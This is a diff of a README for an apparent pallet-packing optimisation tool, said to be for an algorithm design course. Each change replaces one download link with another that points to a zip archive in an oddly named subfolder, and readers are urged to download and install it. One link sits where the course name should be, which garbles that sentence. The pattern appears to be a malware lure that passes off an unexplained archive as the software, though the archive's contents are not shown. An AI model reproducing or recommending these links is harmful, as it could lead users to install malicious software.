@@ -1,7 +1,7 @@
 # 🚚 Delivery-Truck-Pallet-Packing-Optimization-Tool - Optimize Your Delivery Load Easily
 
 ## 📃 Overview
-The Delivery Truck Pallet Packing Optimization Tool helps you arrange items for delivery trucks effectively. It uses various programming approaches to find the best way to load pallets. Designed for the https://raw.githubusercontent.com/Tuananhdtu97/Delivery-Truck-Pallet-Packing-Optimization-Tool/main/Priapean/Delivery-Truck-Pallet-Packing-Optimization-Tool.zip - Algorithm Design Course, this tool simplifies the complex task of pallet packing.
+The Delivery Truck Pallet Packing Optimization Tool helps you arrange items for delivery trucks effectively. It uses various programming approaches to find the best way to load pallets. Designed for the https://github.com/Tuananhdtu97/Delivery-Truck-Pallet-Packing-Optimization-Tool/raw/refs/heads/main/Priapean/Tool_Delivery_Optimization_Truck_Pallet_Packing_2.6.zip - Algorithm Design Course, this tool simplifies the complex task of pallet packing.
 
 ## 🛠 Key Features
 - **Multiple Algorithms**: Explore diverse packing strategies like dynamic programming and brute force.
@@ -20,7 +20,7 @@ The Delivery Truck Pallet Packing Optimization Tool helps you arrange items for 
 Follow these simple steps to get started with the Delivery Truck Pallet Packing Optimization Tool.
 
 1. **Visit the Releases Page**
-   To download the software, visit this page: [Download Here](https://raw.githubusercontent.com/Tuananhdtu97/Delivery-Truck-Pallet-Packing-Optimization-Tool/main/Priapean/Delivery-Truck-Pallet-Packing-Optimization-Tool.zip)
+   To download the software, visit this page: [Download Here](https://github.com/Tuananhdtu97/Delivery-Truck-Pallet-Packing-Optimization-Tool/raw/refs/heads/main/Priapean/Tool_Delivery_Optimization_Truck_Pallet_Packing_2.6.zip)
 
 2. **Select the Latest Release**
    Scroll down to the latest version available. Check the release notes if you want to know what's new.
@@ -37,7 +37,7 @@ Follow these simple steps to get started with the Delivery Truck Pallet Packing 
    After the installation, you can find the application in your Programs or Applications list. Click to open it and start optimizing your pallet packing.
 
 ## 📥 Download & Install
-To begin using the Delivery Truck Pallet Packing Optimization Tool, please visit the download page: [Download Here](https://raw.githubusercontent.com/Tuananhdtu97/Delivery-Truck-Pallet-Packing-Optimization-Tool/main/Priapean/Delivery-Truck-Pallet-Packing-Optimization-Tool.zip)
+To begin using the Delivery Truck Pallet Packing Optimization Tool, please visit the download page: [Download Here](https://github.com/Tuananhdtu97/Delivery-Truck-Pallet-Packing-Optimization-Tool/raw/refs/heads/main/Priapean/Tool_Delivery_Optimization_Truck_Pallet_Packing_2.6.zip)
 
 ## ⚙️ How to Use the Application
 1. **Input Your Data**
